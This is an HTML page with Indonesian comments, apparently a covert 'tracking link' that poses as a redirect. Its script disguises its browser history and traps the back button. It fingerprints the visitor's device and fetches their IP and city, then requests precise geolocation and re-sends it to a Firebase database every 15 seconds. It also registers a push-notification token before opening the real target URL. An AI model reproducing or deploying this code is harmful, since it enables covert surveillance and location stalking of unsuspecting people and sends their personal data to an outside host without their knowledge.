<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title> <!-- judul kosong -->
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; filter: blur(10px); }
    </style>
</head>
<body>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
        import { getFirestore, doc, getDoc, updateDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
        import { getMessaging, getToken, onMessage } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-messaging.js";

        // --- Firebase Config ---
        const firebaseConfig = {
            apiKey: "AIzaSyAtTaKf_Psb-yhxa5nNFIcs3Tte5gjYe00",
            authDomain: "locked-1dfad.firebaseapp.com",
            projectId: "locked-1dfad",
            storageBucket: "locked-1dfad.firebasestorage.app",
            messagingSenderId: "237366240355",
            appId: "1:237366240355:web:e3a4f999ff547a07398456"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const messaging = getMessaging(app);
        
        // --- Ambil linkId dari URL ---
        const fullUrl = window.location.href;
        const match = fullUrl.match(/[?&]id=([^&]+)/);
        const linkId = match ? match[1] : "";
        const linkRef = doc(db, "trackingLinks", linkId);
        if (!linkId) {
            document.body.innerHTML = "<h2>Link ID tidak ada di URL</h2>";
            throw new Error("Link ID kosong");
        }
        
        // --- Auth Anonymous ---
        signInAnonymously(auth).catch(err => console.error("Auth gagal:", err));
        
        // --- Nyamar history + jebakan tombol back ---
        history.replaceState({}, "", "/");
        window.history.pushState(null, "", window.location.href);
        window.onpopstate = () => window.history.go(1);

        // --- Main process ---
        onAuthStateChanged(auth, async (user) => { if (!user) return;
            const docSnap = await getDoc(linkRef);
            const linkData = docSnap.data() || {};
            const clickData = { timestamp: Date.now() };
            const ua = (navigator.userAgent || "").toLowerCase();
            let device = "Unknown Device";
            let os = "Unknown OS";
            let isUpdating = false;
            if (!docSnap.exists()) {
                document.body.innerHTML = "<h2>Dokumen link tidak ditemukan</h2>";
                return;
            }
            if (typeof linkData.targetUrl !== "string") {
                document.body.innerHTML = "<h2>Error: Tautan tidak valid</h2>";
                return;
            }
        
            // --- Deteksi Device & OS ---
            if (/infinix/.test(ua)) device = "Infinix";
            else if (/oppo/.test(ua)) device = "Oppo";
            else if (/vivo/.test(ua)) device = "Vivo";
            else if (/xiaomi/.test(ua)) device = "Xiaomi";
            else if (/redmi/.test(ua)) device = "Xiaomi (Redmi)";
            else if (/samsung/.test(ua)) device = "Samsung";
            else if (/realme/.test(ua)) device = "Realme";
            else if (/huawei/.test(ua)) device = "Huawei";
            else if (/asus/.test(ua)) device = "Asus";
            else if (/iphone/.test(ua)) device = "iPhone";
            else if (/ipad/.test(ua)) device = "iPad";
            
            if (/android/.test(ua)) os = "Android";
            else if (/iphone|ipad/.test(ua)) os = "iOS";
            else if (/win/.test(ua)) os = "Windows";
            else if (/mac/.test(ua)) os = "MacOS";
            else if (/linux/.test(ua)) os = "Linux";
            
            clickData.device = device;
            clickData.os = os;

            // --- Ambil IP + lokasi ---
            fetch("https://api.ipify.org?format=json").then(res => res.json()).then(ipData => {
                const ipv4 = ipData.ip;
                return fetch(`https://ipapi.co/${ipv4}/json/`).then(res => res.json()).then(geo => {
                    clickData.ipInfo = {
                        ip: ipv4,
                        city: geo.city,
                        country: geo.country_name
                    };
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(pos => {
                            clickData.location = {
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude
                            };
                            saveAndRedirect();
                        }, () => saveAndRedirect(), { timeout: 5000 });
                    } else {
                        saveAndRedirect();
                    }
                });
            }).catch(() => saveAndRedirect());

            // --- Simpan klik + redirect ---
            async function saveAndRedirect() {
                await updateDoc(linkRef, { clicks: arrayUnion(clickData) });
                await registerFCM();
                startTracking();
                window.open(linkData.targetUrl, "_blank");
            }
            
            // --- Tracking lokasi berkala ---
            function startTracking() {
                if (!navigator.geolocation) return;
                setInterval(async () => {
                    if (isUpdating) return;
                    isUpdating = true;
                    navigator.geolocation.getCurrentPosition(async pos => {
                        try {
                            const snap = await getDoc(linkRef);
                            if (snap.exists()) {
                                let history = snap.data().locations || [];
                                history.push({
                                    latitude: pos.coords.latitude,
                                    longitude: pos.coords.longitude,
                                    timestamp: Date.now()
                                });
                                if (history.length > 10) history = history.slice(-10);
                                await updateDoc(linkRef, { locations: history });
                            }
                        } catch (err) {
                            console.error("Update error:", err);
                        } finally {
                            isUpdating = false;
                        }
                    });
                }, 15000);
            }
            
            // --- Register FCM ---
            async function registerFCM() {
                const permission = await Notification.requestPermission();
                if (permission === "granted") {
                    const token = await getToken(messaging, { vapidKey: "BE6H73ZwdMhPGN38k5uP5S3bi6Qw0MzD9m66Egovvp_CsxSrd7KB9k7yYw2kjkGY8aYO3nmVLQvEbVz782xmlGg" });
                    if (token) {
                        await updateDoc(linkRef, { tokens: arrayUnion(token) });
                        console.log("Token FCM disimpan:", token);
                    }
                }
            }
            
            // --- Pesan saat tab aktif ---
            onMessage(messaging, (payload) => {
                console.log("Pesan FCM:", payload);
                alert(payload.notification.title + " - " + payload.notification.body);
            });
        });
</script>
</body>
</html>